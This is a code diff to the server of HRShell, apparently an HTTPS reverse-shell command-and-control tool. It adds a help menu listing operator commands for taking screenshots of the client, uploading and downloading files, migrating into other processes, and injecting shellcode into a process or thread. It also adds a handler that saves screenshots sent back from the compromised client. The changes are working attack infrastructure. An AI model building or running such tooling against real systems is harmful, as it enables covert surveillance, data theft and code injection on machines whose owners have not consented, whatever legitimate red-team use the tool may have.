@@ -4,10 +4,11 @@
 __Author__      = 'Christophoros Petrou (game0ver)'
 __Project_url__ = 'https://github.com/chrispetrou/HRShell'
 __License__     = 'GNU General Public License v3.0'
-__Version__     = '1.5'
+__Version__     = '1.6'
 
 import os
 import re
+import io
 import sys
 import ssl
 import time
@@ -22,6 +23,7 @@ from flask import (
     redirect,
     Blueprint
 )
+from PIL import Image
 from random import randint
 from threading import Thread
 from binascii import hexlify
@@ -51,7 +53,7 @@ from tornado.httpserver import HTTPServer
 
 # CONSOLE-COLORS
 B, D, RA = Style.BRIGHT, Style.DIM, Style.RESET_ALL
-BL, R, C, Y  = Fore.BLUE, Fore.RED, Fore.CYAN, Fore.YELLOW
+BL, R, C, Y, G  = Fore.BLUE, Fore.RED, Fore.CYAN, Fore.YELLOW, Fore.GREEN
 
 c1, c2, waiting = 0, 0, True
 progress = {
@@ -73,6 +75,7 @@ clientIP = ""
 emptyresponse = ('', 204)
 upload_contents, cmd_contents = "", ""
 
+help_cmd        = re.compile(r'^\s*help\s*')
 exit_cmd        = re.compile(r'^\s*exit\s*')
 clear_cmd       = re.compile(r'^\s*clear\s*')
 unix_path       = re.compile(r'^\s*download\s*((.+/)*([^/]+))$')
@@ -81,6 +84,20 @@ wind_path       = re.compile(r'^\s*download\s*((.+\\)*([^/]+))$')
 wind_upld       = re.compile(r'^\s*upload\s*(.+\\)*([^/]+)$')
 set_shellcode   = re.compile(r'^\s*set\s*shellcode\s*(\d+)\s*$')
 show_shellcodes = re.compile(r'^\s*show\s*shellcodes\s*$')
+
+# available commands...
+commands = f"""
+{B}help:{RA} show available commands.
+{B}screenshot:{RA} captures a screenshot from the client.
+{B}upload <file or path to file>:{RA} uploads a file to the client.
+{B}download <file or path to file>:{RA} downloads a file from the client.
+{B}migrate <PID>:{RA} attempts to inject shellcode on the process with the specific PID.
+{B}inject shellcode:{RA} injects shellcode into a thread of the current process.
+{B}show shellcodes:{RA} shows all available to use shellcodes based on 'shellcodes/utils.py' script.
+{B}set shellcode <shellcode-id>:{RA} set shellcode to a custom shellcode specified by its id.
+{B}clear:{RA} clears the screen (it's the same for both unix and windows systems).
+{B}exit:{RA} closes the connection with the client.
+"""
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = hexlify(os.urandom(16)) # you can change that to something permanent...
@@ -289,6 +306,9 @@ def handleGET():
                 except KeyError:
                     print(f"[x] There is no shellcode with id: {shc_id}")
                     return emptyresponse
+            elif help_cmd.match(cmd):
+                print(commands[1:-1])
+                return emptyresponse
             elif exit_cmd.match(cmd):
                 cmd_contents = cmd
                 waiting = True
@@ -311,9 +331,14 @@ def handlePOST():
             if request.headers.get('Action') == 'download':
                 with open(filename, 'wb') as w:
                     w.write(bdec(request.data))
-                print(f'{filename} successfully downloaded!')
+                print(f'[{B+G}SUCCESS{RA}] {filename} successfully downloaded!')
             else:
-                print(f'{filename} successfully uploaded!')
+                print(f'[{B+G}SUCCESS{RA}] {filename} successfully uploaded!')
+        elif request.headers.get('Action') == 'screenshot':
+            img = Image.open(io.BytesIO(request.data))
+            screenshot_name = f"screenshot_{randint(0,1000)}.png"
+            img.save(screenshot_name)
+            print(f'[{B+G}SUCCESS{RA}] {screenshot_name} successfully downloaded!')
         elif request.headers.get('Shellcode_id'):
             slowprint(f"[+] Shellcode successfully set to: {Y+utils.shellcodes[int(request.headers.get('Shellcode_id'))][0]}{RA}")
         else:
